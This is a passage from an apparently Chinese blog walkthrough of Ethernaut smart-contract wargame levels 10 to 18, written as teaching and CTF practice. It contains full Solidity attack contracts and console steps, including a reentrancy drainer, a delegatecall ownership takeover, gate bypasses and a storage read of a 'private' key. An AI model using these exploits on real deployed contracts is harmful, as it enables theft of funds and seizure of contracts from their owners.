这个合约的问题在哪里呢？那就是他弄错了记账、转账的顺序（先转账，再记账）。一般来说，我们去银行取钱，银行都会先在自己的账本上记一笔，然后才会把钱取出来给我们。虽然说，我们也不可能同时出现在两个地方取钱，但在区块链中，有没有可能呢？

答案是有的，如果我们在接受合约转账的同时又发起新的取钱操作，那么很明显，如果是连续的调用过程，在未修改账本的情况下，合约仍会给用户转账？

那么，怎样做才能保证实现连续的调用呢？那就是使用合约去与被攻击合约进行交互。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```
pragma solidity ^0.6.0;


interface Reentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balanceOf);
}

contract Attacker {
    Reentrance ReentranceImpl;
    uint256 requiredValue;

    constructor(address addr) public payable{
    ReentranceImpl = Reentrance(addr);
    requiredValue = msg.value;
    }

    function getBalance(address addr) public view returns (uint){
        return addr.balance;
    }

    function donate() public {
        ReentranceImpl.donate{value:requiredValue}(address(this));
    }

    function withdraw(uint _amount) public {
        ReentranceImpl.withdraw(_amount);
    }

    function destruct() public {
        selfdestruct(msg.sender);
    }

    fallback() external payable {
        uint256 ReentranceImplValue = address(ReentranceImpl).balance;
        if (ReentranceImplValue >= requiredValue) {
            withdraw(requiredValue);
        }else if(ReentranceImplValue > 0) {
            withdraw(ReentranceImplValue);
        }
    } 
}


```

我们使用`ReentranceImpl`标记目标合约，使用`requiredValue`来表示合约在目标合约中存的钱。同时，我们又定义`fallback`函数，每当受到资金时，就会调用`withdraw`函数，从目标合约中提取余额。让我们进行合约交互。

## 合约交互
先查看合约本身有多少以太，在浏览器上查看，发现总共有0.001以太。
![合约本身有0.001以太](https://img-blog.csdnimg.cn/df3f6681bdf44ddd97d73c116542c7ef.png#pic_center)
所以我们在部署合约时传入500000000000000 Wei，这样能反复调用三次，以确认合约的攻击效果，同时我们传入目标合约地址`0xfe3E5BdD6E5ae5efb4eea5735b3E3738991fFc2e`，部署后，攻击合约地址为`0xc9bf4c2AcdBd38CF8f73541f78A2E30Eb5e91287`。

首先我们查询合约本身余额，为500000000000000 Wei，其次我们查询目标合约余额，为1000000000000000 Wei。
![合约本身余额](https://img-blog.csdnimg.cn/f9c0c1c823dd4d349c53fb05ad7bc274.png#pic_center)
![目标合约余额](https://img-blog.csdnimg.cn/6d5c868b01964915a3bae697b33b250d.png#pic_center)
我们利用`donate`函数向目标合约存入余额。
![存入余额](https://img-blog.csdnimg.cn/4513490c53d54d549e9feb651e2114ca.png#pic_center)
此时，目标合约的余额也变成了0.0015Ether。
我们接下来发起攻击，即使用`withdraw`函数提取500000000000000 Wei。发起交易时，应在小狐狸界面修改gas。等待交易完成，此时有合约中实现了三笔转账。
![攻击完成](https://img-blog.csdnimg.cn/a082d4937ef34fd9a895022d27c8ba72.png#pic_center)
而目标合约余额已经归零，攻击完成！
![目标合约归零](https://img-blog.csdnimg.cn/83856fdd90d9424aa01bc5bfbafad993.png#pic_center)
提交实例，本关卡完成！
![关卡完成](https://img-blog.csdnimg.cn/55be13709a304bb2b3b5d28a59bc4c67.png#pic_center)

最后别忘了通过合约自毁(destruct)收回余额哦～

![状态变化](https://img-blog.csdnimg.cn/a7a36ccb71d14284a6e7a323f2b81efd.png#pic_center)

## 总结
合约的设计应当充分谨慎，任意一点疏忽都会带来很大影响
<hr>

# 11 Elevator
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x02B4EC4229691A89Df659F8AEb1D6267F4bc85BE`。对其合约展开分析，其合约核心代码如下:

```
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

由于先判断`isLastFloor`，不满足后才进入`if`结构体，并再次获取`isLastFloor`。该合约于是想当然认为，第二次获取的结果依然不满足，是这样吗？

由于对外调用带来的影响，在外部调用时合约无法控制外部合约的行为。所以我们可以编写智能合约发起相关进攻。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```
pragma solidity ^0.6.0;

interface   Elevator{
    function goTo(uint _floor) external;
}

contract Building {

    Elevator elevatorImpl;
    bool isTop;


    constructor(address addr) public {
        elevatorImpl = Elevator(addr);
        isTop = false;
    }

    function flip() public {
        isTop = !isTop;
    }

    function isLastFloor(uint) public returns (bool){
        bool res = isTop;
        flip();
        return res;
    }
    
    function attack() public {
        elevatorImpl.goTo(1);
    }
}
```
其核心之处在于，每次调用`isLastFloor`函数都会内部调用`flip`函数完成变量`isTop`的翻转，因此连续两次获取的结果是不一样的。

## 合约交互
输入`await contract.top()`查看是否为顶层，结果为false。
![await contract.top()](https://img-blog.csdnimg.cn/bb21c1e0ad474c24bfffa5fa193d602c.png#pic_center)
部署合约，传入目标合约`0x02B4EC4229691A89Df659F8AEb1D6267F4bc85BE`，构建合约的地址为`0x0906dCbd3C31CDfB6A490A04D7ea03fC19F7a40a`。

调用`attack()`函数，发起对目标合约的攻击。
![attack()](https://img-blog.csdnimg.cn/8ba2b461371e4a7aa623b836df9f29d8.png#pic_center)
此时，再次查看，输入`await contract.top()`查看是否为顶层，结果为true。
![await contract.top()](https://img-blog.csdnimg.cn/87dbcdb0a3bf473ba077dc181d3eadc6.png#pic_center)
提交实例，本关卡成功！
![关卡成功！](https://img-blog.csdnimg.cn/6855abc8b6e644b0ac54e4da66cd551e.png#pic_center)
## 总结
合约是难以相信的，即使合约编写的再好，无法控制他人的行为，也毫无用处。
<hr>

# 12 Privacy
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x5a5F99370275Ca9068DfDF9E9edEB40Cb8d9aeFf`。对其合约展开分析，其合约核心代码如下:
```
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
```
此时，应当输入`data[2]`，而这又该怎么获得呢？很明显，我们还是要从存储机制入手。

```
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
```
这是变量定义，对应的，我们有槽存储分布如下：
```
-----------------------------------------------------
| unused (31)    |          locked(1)               | <- slot 0
-----------------------------------------------------
|                       ID(32)                      | <- slot 1
-----------------------------------------------------
| unused (28) | awkwardness(2) |  denomination (1) | flattening(1)  | <- slot 2
-----------------------------------------------------
| data[0](32)  | <- slot 3
-----------------------------------------------------
| data[1](32)  | <- slot 4
-----------------------------------------------------
| data[2](32)  | <- slot 5
-----------------------------------------------------
```
所以，`data[2]`存储在slot 5里。

## 合约交互
输入`await web3.eth.getStorageAt(contract.address,5)`得到`data2='0xad4d68dd2ede6bf23b06d5ed3076ab0d4aae1aac23a1ebaea656ec35650d4ac3'`。
![await web3.eth.getStorageAt(contract.address,5)](https://img-blog.csdnimg.cn/3a79692e76a94b8ab6b731fcac1e4f82.png#pic_center)
此时bytes16与bytes32之间存在转换。要注意，以太坊有两种存储方式，大端（strings & bytes，从左开始）及小端（其他类型，从大开始）。因此，从32到16转换时，需要砍掉右边的16个字节。

我们该怎么做呢？即`'0xad4d68dd2ede6bf23b06d5ed3076ab0d4aae1aac23a1ebaea656ec35650d4ac3'.slice(0,34)`。

![手动拆分](https://img-blog.csdnimg.cn/e46ea1b1f1024a18b854d2a0e5407698.png#pic_center)
之后，直接提交结果，准备解锁。`contract.unlock('0xad4d68dd2ede6bf23b06d5ed3076ab0d')`。
![contract.unlock('0xad4d68dd2ede6bf23b06d5ed3076ab0d](https://img-blog.csdnimg.cn/2980d09b9c48417aa96f72546033653c.png#pic_center)
此时，合约已经完成解锁。
![await contract.locked()](https://img-blog.csdnimg.cn/dc420d0de99b4a998d5daecd423316d4.png#pic_center)
提交实例，本关卡成功！

![关卡成功！](https://img-blog.csdnimg.cn/6b4f528714804def8e86a92ecb73bc32.png#pic_center)

## 总结
还是那句话，区块链上没有秘密。
<hr>

# 13 GateKeeper One
大家好 我又回来了。最近真的很忙，我抓紧8月份将这一系列完成，然后进行下一步内容的分享。
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xBc0820c5Ab83Ab2E8e97Fa04DDd3444ECC212284`。本关卡的目的是满足`gateOne`、`gateTwo`和`gateThree`，成功实现`entrant`的修改。

那么我们需要怎么做呢？首先看一看`modifier`分别提出了什么要求。看看能否满足和修改？
```
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```
分析`gateOne`，可以看出需要`msg.sender != tx.origin`，这表明我们需要一个合约作为中转。
```
  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
```
分析`gateTwo`，这表明在执行到该步骤时，需要剩下的gas必须为8191的倍数，这需要我们对gas作出设定。
```
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```
分析`gateThree`，这表明需要输入特殊的bytes8数据，保证其1-16位为tx.origin的数据且17-32位为0（`uint32(uint64(_gateKey)) == uint16(tx.origin),`），33-64位不全为0（`uint32(uint64(_gateKey)) != uint64(_gateKey)`）。

所以我们可以整理思路，编写智能合约了。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```
pragma solidity ^0.6.0;

interface Gate {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract attackerSupporter {

    uint64 offset = 0xFFFFFFFF0000FFFF;
    bytes8 changedValue;
    Gate gateImpl;

    constructor(address addr) public {
        gateImpl = Gate(addr);
    }

    function getAddress() public {
        changedValue = bytes8(uint64(tx.origin) & offset);
    }

    function check1() public view returns (bool){
        return uint32(uint64(changedValue)) == uint16(uint64(changedValue));
    }

    function check2() public view returns (bool){
        return uint32(uint64(changedValue)) != uint64(changedValue);
    }

    function check3() public view returns (bool){
        return uint32(uint64(changedValue)) == uint16(tx.origin);
    }

    function attack() public {
        gateImpl.enter(changedValue);
    }
}
```

这里主要看为什么能够解决`gateThree`的需求。当获取输入的时候，会进行`bytes8(uint64(tx.origin) & offset)`运算。

- `address`类型长度为160位，20字节，40个十六进制
- `uint64(tx.origin)`对`tx.origin`进行了截取，选取后64位，8字节，16十六进制。
- `offset`类型为`uint64`，默认值为`0xFFFFFFFF0000FFFF`，最后的`FFFF`保证其最后16位不发生改变，中间的`0000`保证17-33位为0,剩下的`FFFFFFFF`则保证34-64位不全为0（只要`tx.origin`不是这样就好）。
- 通过`&`运算完成变换，以`bytes8`存储在`changedValue`变量，用以实际攻击。

## 合约交互
部署合约，传入目标合约`0xBc0820c5Ab83Ab2E8e97Fa04DDd3444ECC212284`，构建合约的地址为`0x9CeD0A7587C4dCb17F6213Ea47842c86a88ff43d`。

![部署合约](https://img-blog.csdnimg.cn/1149ddfa98dc4bf6831ae6fbef209049.png#pic_center)
点击`getAddress`，计算`changedValue`。此时，点击`check1`、`check2`、`check3`来查看`gateThree`的要求是否满足。由截图可见，均满足。
![gateThree已满足](https://img-blog.csdnimg.cn/f5071699f3e743c4845d6723bbc386d7.png#pic_center)
由于`gateOne`已经自动满足了，所以我们可以直接通过调用来调试实际的gas了。
点击`attack`发起进攻，由于是跨合约调用，所以我们先将Gas Limit调大一些（实际远远不用这么大），如图所示。
![设置gas](https://img-blog.csdnimg.cn/9f47115a617c40558e0f599ac920ccc0.png#pic_center)


此时，我们进入测试网Explorer查看交易详细信息，不出意外，交易将会被回滚。这是因为当前的gas没有满足要求。
![交易回滚](https://img-blog.csdnimg.cn/60ba5e837f7240c3a7245c768d24ad2d.png#pic_center)

点击右上角，选择`Geth Debug Trace`来看详细的编译过程。
![Geth Debug Trace](https://img-blog.csdnimg.cn/44de7cd5168d448091699d6ae188ca7e.png#pic_center)
里面是每步操作的执行过程及其所消耗的GAS。
![Geth Debug Trace 详情](https://img-blog.csdnimg.cn/e9cab8a77c1741be90321d5e5313b3af.png#pic_center)

页面中搜索GAS，操作中总共有2个，分析整个调用顺序，应该前者是合约内部调用前发起，后者则是`gateTwo`通过`gasLeft`主动发起。所以记下该GAS操作后剩余的gas（因为查询本身也会消耗gas），此处为70215。我们可以根据该值除8191的余数调整gas limit直至完成攻击。
![GAS详情](https://img-blog.csdnimg.cn/f4cbcc347b8b49589c307b19830d0d85.png#pic_center)

下表则是我们的发起过程，需要重复进行几次才能完成攻击。
| 原始gas Limit | GAS操作后剩余gas | 余数 | 下一次输入gas |
| ------------- | ---------------- | ---- | ------------- |
| 100000        | 70215            | 4687 | 95313         |
| 95313         | 65601            | 73   | 95240         |
| 95240         | 65529            | 1    | 95239         |

注意当gas设置为95239后，交易成功。如截图所示：
![攻击成功](https://img-blog.csdnimg.cn/7c0addb391064a6f9d01fdd2fd7d4f10.png#pic_center)
输入`await contract.entrant() == player`，此时返回true表明攻击成功。
![await contract.entrant() == player](https://img-blog.csdnimg.cn/e21cafd99dae41f5951f1eae9e93352b.png#pic_center)
提交实例，本关卡成功！

![关卡成功](https://img-blog.csdnimg.cn/c4fd864253a34a808df29133f8ca79ee.png#pic_center)
## 总结
Gas的调试很有意思，值得细细研究。
<hr>

# 14 GateKeeper Two
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xc2F1c976Bc795C43F7C9B56Ab69d5c06Daa7d53F`。本关卡的目的是满足`gateOne`、`gateTwo`和`gateThree`，成功实现`entrant`的修改。

观察其核心代码，依旧是`gateOne`、`gateTwo`和`gateThree`。

- `gateOne`依旧是要求`msg.sender != tx.origin`，即必须有一个中间合约。
- `gateTwo`要求`extcodesize(caller())==0`，即调用者（对应msg.sender）的关联代码长度为0，而我们知道，智能合约代码是不为0的。
- `gateThree`则要求输入对应的bytes8满足相应的要求。

乍一看似乎`gateOne`和`gateTwo`无法同时满足，但是可以考虑到，当合约正在构建时，其关联代码也是为0的。所以我们可以在构建函数里发起攻击。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```
pragma solidity ^0.6.0;

interface Gate {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract attackerSupporter {

    constructor(address addr) public {
        Gate gateImpl = Gate(addr);
        bytes8 input = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        gateImpl.enter(input);
    }
}
```
值得注意的是，我们这里针对`gateThree`使用了主动下溢出获取全为1的`uint64`（两次异或就消失了）。

## 合约交互
部署合约，传入目标合约`0xc2F1c976Bc795C43F7C9B56Ab69d5c06Daa7d53F`，构建合约的地址为`0xE0CCEeA724E2eF32A573348975538DEf0eeBC74f`。

部署成功后，利用`await contract.entrant() == player`查看是否攻击成功。答案是成功的。

![await contract.entrant() == player](https://img-blog.csdnimg.cn/a77885e5b08f4a0f8845994a7b813784.png#pic_center)
提交实例，本关卡成功！
![关卡成功](https://img-blog.csdnimg.cn/a49621f4152245eab2219de55f2fa709.png#pic_center)
## 总结
那该如何保证不处理智能合约发来的请求呢？`msg.sender=tx.origin`即可。
<hr>

# 15 Naught Coin
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x30A758458135a40eA5c59c7F171Fd6FFe08e00c2`。本关卡的目的是将自身的余额变为0。

乍一看合约，对`player`存在如下限制：
```
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
```
似乎是无法绕过的，我们似乎也无法通过合约进攻，因为默认是扣去自身的token。
但有一看，`NaughCoin`是继承`ERC20`，而我们知道`ERC20`中可不只一个转账函数。我们可以试试通过其他方法。

仔细一看，原始的`ERC20`中还存在`transferFrom`函数。
```
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
```
当然，这前提是有足够的allowance。我们可以开始试试了。

## 合约交互
首先通过`await contract.approve(player,await contract.balanceOf(player))`，使得自身可以通过`transferFrom`函数进行转账。
![await contract.approve(player,await contract.balanceOf(player))](https://img-blog.csdnimg.cn/96c676e69b254281ab1599e19f73962f.png#pic_center)
随后我们通过`await contract.transferFrom(player,contract.address,await contract.balanceOf(player))`将余额转移到合约。
![await contract.transferFrom(player,contract.address,await contract.balanceOf(player))](https://img-blog.csdnimg.cn/a6e260e856814ebb9fda2c4c32d5e250.png#pic_center)
此时再通过`await contract.balanceOf(player)`查看余额，可知攻击成功，余额为0。
![await contract.balanceOf(player)](https://img-blog.csdnimg.cn/7792af7bd4c246cfaef6c4a02d99e337.png#pic_center)
提交实例，本关卡成功！
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f50bcd3405a49c383ebdc101ac11d07.png#pic_center)
## 总结
继承部分函数不影响其他的使用，这可以说的上是表面合约了。
<hr>

# 16 Preservation
我又回来了，给外方的培训算是快要告一段落，在这段过程中，我认为我也有许多收获。在培训、讲解的过程中，我的思路也变得更为清晰了。可喜可贺。理论上来说，我初步计划的是在8月完成Ethernaut的攻防，然后开启下一阶段的分享。

## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x2f3aC08a3761D8d97A201A36f7f0506CEAaF1046`。本关卡的目的是获取目标合约的所有权。那我们还是要看看，目标合约的薄弱点在哪里，我们**hack**的入口又在哪里？

我们对目标展开详细分析
```
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
```
此处目标存储了`timeZone1Library`、`timeZone2Library`、`owner`及`storedTime`变量，而前三者都是在创建时指定的。

既然要获取目标合约的所有权，首先我们查找修改`owner`的语句，但是翻遍代码都没有找到，或许我们得看看有哪些**危险函数**？
```
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
```
没错，就是这里，delegatecall！
其实，在`Delegation`一关中，我们专门提到过call函数族中的区别：

- call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者B，执行环境为被调用者的运行环境C。
- delegatecall:调用后内置变量 msg 的值A不会修改为调用者B，但执行环境为调用者的运行环境B
- callcode:调用后内置变量 msg 的值A会修改为调用者B，但执行环境为调用者的运行环境B

此时，使用delegate call时，我们只是相当于调用了函数，而实际执行环境还是本身的运行环境。如果要更为底层的来说，又该怎么理解呢？这个环境，尤其是涉及到**storage**变量的存储时，是根据插槽来使用的，而不是变量的名字。换句话来说，我们如果通过delegate call修改storage变量，其实是修改当前环境下对应的插槽！

理解了这一点，我们再来看当前合约，真是怎么看怎么不对劲：当调用对应合约`LibraryContract`的`setTime`函数后，如所见即所得，`storedTime`变量被修改，这其实会修改运行环境下的`slot 0`，换而言之，其实`timeZone1Library`所处的插槽已经被修改了。这个合约本身就是有问题的！

也就是因为它有问题，我们才要处理它！我们首先想将`timeZone1Library`的地址修改为我们的攻击合约，在想办法通过delegate call实现后续的攻击。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```
pragma solidity ^0.6.0;


contract attacker {

    address public tmpAddr1;
    address public tmpAddr2;
    address public owner; 

    constructor() public {

    }

    function setTime(uint _time) public {
        owner = address(_time);
    }

}
```
乍一看，这和原来合约的有什么区别么？其实有的，就是我们在修改时特意使得修改的是第三个插槽，也就是`slot 2`。变量`tmpAddr1`和`tmpAddr2`其实只是一个插槽的占位符，并无特殊含义。

## 合约交互
首先我们部署攻击合约，合约地址为`0x852D36AcCF80Eb6611FC124844e52DC9fC72c958`。现在我们就是想用其替换原有的变量`timeZone1Library`。

首先，我们可以查询目标合约目前的插槽状况。
![slot](https://img-blog.csdnimg.cn/d51adccdd66e472096f561c69ac5330b.png#pic_center)
其布局应当为
```
-----------------------------------------------------
| 0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5        | <- slot 0
-----------------------------------------------------
| 0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1        | <- slot 1
-----------------------------------------------------
| 0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F        | <- slot 2
-----------------------------------------------------
| 	                storedTime                      | <- slot 3
-----------------------------------------------------
```
我们试着调用`await contract.setFirstTime()`（first 还是 second 其实并不影响，可以思考以下为什么）并传入我们的攻击合约。此时可以看到其实已经发生了改变。我们可以直接传入地址而不去在意uint的限制，因为具体构建的data并不会指明参数类型，而会是evm手动的编译。
![嵌入攻击合约](https://img-blog.csdnimg.cn/a865207d0ca941cda80372514aed162e.png#pic_center)
此时，其布局应当为
```
-----------------------------------------------------
| 0x852D36AcCF80Eb6611FC124844e52DC9fC72c958       | <- slot 0
-----------------------------------------------------
| 0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1        | <- slot 1
-----------------------------------------------------
| 0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F        | <- slot 2
-----------------------------------------------------
| 	                storedTime                      | <- slot 3
-----------------------------------------------------
```
此时，想法就很简单，直接调用`await contract.setFirstTime()`并传入player地址。传入后查看owner变量是否发生修改，可以看到已经成功获取到了合约所有权。
![成功获取到了合约所有权](https://img-blog.csdnimg.cn/80fc8740a85648938ce94bc40fbbb2f3.png)
此时布局为：
```
-----------------------------------------------------
| 0x852D36AcCF80Eb6611FC124844e52DC9fC72c958       | <- slot 0
-----------------------------------------------------
| 0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1        | <- slot 1
-----------------------------------------------------
| 0x0bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b        | <- slot 2
-----------------------------------------------------
| 	                storedTime                      | <- slot 3
-----------------------------------------------------
```
提交实例，本关卡完成！
![关卡完成](https://img-blog.csdnimg.cn/fb8b10df319946dea974e78dbea29429.png#pic_center)

## 总结
还是得明白 delegate call共享环境到底共享的是什么。
<hr>

# 17 Recovery
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x2f3aC08a3761D8d97A201A36f7f0506CEAaF1046`。本关卡的目的是找到“丢失的地址”（我们给他转去了0.001ether却忘记了其地址）并恢复丢失的以太。

这题其实有两种思路，一种略微取巧了，第二个我猜是题目真正想考的。
根据题目描述可以知道，这其实是一个连续的过程：**合约创建者**创建**通证合约的工厂合约**，后者再创建**通证合约**(被遗忘的地址）。我们就围绕这个思路展开。

## 合约交互
### 找到遗忘的地址，方法一 ： 基于浏览器
这里的浏览器可不是Browser，而是**Explorer**。
我们可以查看自己的交易记录。可以看到我们在里面还转移了两次0.001以太。
![交易记录](https://img-blog.csdnimg.cn/483dc13864ab420f954b53c6517a00f8.png#pic_center)
我们可以基于内部调用展开分析。整体流程如下：

- 用户账户调用Ethernaut合约`0xd991431d8b033ddcb84dad257f4821e9d5b38c33`
- Ethernaut合约`0xd991431d8b033ddcb84dad257f4821e9d5b38c33`调用关卡合约`0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2`并转账0.001Ether
- 关卡合约`0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2`创建工厂合约`0xfeB7158F1d0Ff49043e7e2265576224145b158f2`
- 关卡合约`0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2`调用工厂合约`0xfeB7158F1d0Ff49043e7e2265576224145b158f2`，应该是`generateToken`接口
- 工厂合约`0xfeB7158F1d0Ff49043e7e2265576224145b158f2`创建了通证合约`0x9d91ABf611BBf14E52FA4cddEa81F8f2CF665cb8`
- 关卡合约`0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2`向通证合约`0x9d91ABf611BBf14E52FA4cddEa81F8f2CF665cb8`转账0.001Ether，随后忘记该合约地址。

![在这里插入图片描述](https://img-blog.csdnimg.cn/8418ac2360be49d882abcb4bff9c4c54.png#pic_center)
通过浏览器，我们找到了该通证合约地址为`0x9d91ABf611BBf14E52FA4cddEa81F8f2CF665cb8`。

### 找到遗忘的地址，方法二 ： 基于地址生成
其实，合约地址的生成是有规律可寻的。经常可以看到有的通证或组织跨链部署的合约都是同样的，这是因为合约地址是根据创建者的地址及nonce来计算的，两者先进行RLP编码再利用keccak256进行哈希计算，在最终的结果取后20个字节作为地址（哈希值原本为32字节）。

- 创建者的地址是已知的，而nonce也是从初始值递增获取到的。
- 外部地址nonce初始值为0，每次转账或创建合约等会导致nonce加一
- 合约地址nonce初始值为1，每次创建合约会导致nonce加一（内部调用不会）

我们用web3.js试试召回丢失的合约地址。目前已知工厂合约为`0xfeB7158F1d0Ff49043e7e2265576224145b158f2`，nonce为1,
输入为`web3.utils.keccak256(Buffer.from(rlp.encode(['0xfeB7158F1d0Ff49043e7e2265576224145b158f2',1]))).slice(-40,)`，结果为`9d91abf611bbf14e52fa4cddea81f8f2cf665cb8`。

### 找回
找到了合约，现在就要尝试和合约进行交互。我们可以新建合约，也可以直接通过web3.js与合约进行交互。

首先，我们通过encodeFunctionSignature获取函数指示，并构造参数。最后通过sendTransaction发送出来。
![构造参数](https://img-blog.csdnimg.cn/038e2280aeea478798d90dd250ef333a.png#pic_center)
可以看到有4字节的函数以及32字节的输入（不够的补0）。
![在这里插入图片描述](https://img-blog.csdnimg.cn/8ba827fa720f4d80b480fc9721c72384.png#pic_center)
成功调用！
![成功调用](https://img-blog.csdnimg.cn/5f4920206a744b93b0d76afc540a078a.png#pic_center)
提交实例，本关卡成功！
![在这里插入图片描述](https://img-blog.csdnimg.cn/ccddf408a59d4a27a557de11c1029223.png#pic_center))
## 总结
其实感觉自己原理都知道，但实操起来总有些不熟练，还得多练习～
<hr>

# 18 MagicNumber
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x36c8074B1F138B7635Ad1eFe0c2b37b346EC540c`。本关卡就是希望我们能手写solidity的opcode，构建合约，再被调用是能直接返回魔数`0x42`。准确来说，就是希望我们熟悉当我们创建合约的时候，transaction中的data实际指的是什么。

这一块其实我也不是特别熟悉，所以也查询了一些资料。当我们用Solidity部署合约时，究竟会发生些什么？

- Solidity代码已经写好，当用户点击部署时，会发送创建合约的交易（此交易没有`to`选项），此时solidity语言已经被编译为字节码
- EVM接收到请求后会将data取出来，这实际上是字节码
- 字节码将会被载入到栈内，分为两部分：初始化字节码及运行态字节码
- EVM将会执行初始化字节码，并将运行态字节码返回用以正常时的利用。

我们这里其实既要写运行态字节码，又要写初始化的字节码。

那就开始编写字节码。

## 合约编写
### 运行态字节码
运行态其实就是直接返回`RETURN` 42。可是opcode`RETURN`是基于栈的。它会读取栈中的p和s并返回。其中`p`代表存储的内存地址，而`s`代表的是存储数据的大小。所以我们的思路就是，先把数据利用`mstore`存到内存里，再利用`RETURN`返回。

- `mstore`会读取栈中的p和v，并最终将数据存储到p位置上
	
	- `push1 0x42` -> `60 42`
	- `push1 0x60` -> `60 60`（存储在0x60的位置）
	- `mstore` -> `52`

- `RETURN`返回`0x42`

	- `push1 0x20` -> `60 20`（`0x20=32`即uint256的字节数）
	- `push1 0x60` -> `60 60`
	- `return` -> `f3`

合起来就是`604260605260206060f3`。看上去运行态字节码就这么简单。

### 初始化字节码
其核心就是初始化并通过`codecopy`将运行态字节码存到内存去，在这之后，这将自动地被EVM处理并存储到区块链上。

- `codecopy`会读取参数t、f、s，其中`t`是代码的目的内存地址，`f`是运行态代码相对于整体（初始化+运行态）的偏移，而`s`则是代码大小。我们这里选择`t=0x20`（这里没有强制性要求），`f=unknown（是1字节的偏移量）`，`s=0x0a（10个字节的大小）`

	- `push1 0x0a` -> `60 0a`
	- `push1 0xUN` -> `60 UN`
	- `push1 0x20` -> `60 20`
	- `codecopy` -> `39`

- 通过`RETURN`将代码返回给EVM

	- `push1 0x0a` -> `60 0a`
	- `push1 0x20` -> `60 20`
	- `return` -> `f3`
此时初始化字节码有12字节，所以运行态偏移为`12=0x0c=UN`
最终初始化字节码为`600a600c602039600a6020f3`

### 构建与测试
构建字节码`0x600a600c602039600a6020f3604260605260206060f3`。
我们在console界面构造了交易以创建合约。
![创建合约](https://img-blog.csdnimg.cn/d7520fd6b81c48c59f1faa8aee322a47.png#pic_center)
由于交易没有接受方，自动被识别为部署合约
![部署合约](https://img-blog.csdnimg.cn/9292038ac1e74177b38f04d98aea4162.png#pic_center)
部署完成，可以看出，合约地址为`0xAcA8C7d0F1E90272A1bf8046A6b9B3957fbB4771`。
![部署完成](https://img-blog.csdnimg.cn/03c6002fd8db4e208684b05914371ce4.png#pic_center)
将合约设置为solver。后面当我们提交后会自动调用以查看是否满足。
![设置solver](https://img-blog.csdnimg.cn/76d6e43938cc419597cfb64d8cfef009.png#pic_center)
提交关卡，进行检验，发现没有成功？怎么回事？

先查看交易的`RAW TRACE`，可以看出最后的确是访问了我们的合约，也的确是返回了0x42。

![DEBUG TRACE](https://img-blog.csdnimg.cn/0b2726105da444e6b6d476f138abc69e.png#pic_center)
再去看汇编，可以看到，的确也是执行了。
![汇编检查](https://img-blog.csdnimg.cn/7a72c868157048da8476259e049345af.png#pic_center)
随即我们在remix上的导入，调用函数，的确也都返回0x42。
![remix结果正常](https://img-blog.csdnimg.cn/6ce277455f6a42cba992cf8ade510240.png#pic_center)
难道？我们修改返回的值从0x42到42（`0x2a`）。

构建字节码`0x600a600c602039600a6020f3602a60605260206060f3`。
此时通过remix调用，的确都返回42。再提交看看？成功了！
![关卡成功](https://img-blog.csdnimg.cn/cefedff360ea4c73a7e4267a6362a4e9.png#pic_center)
## 总结
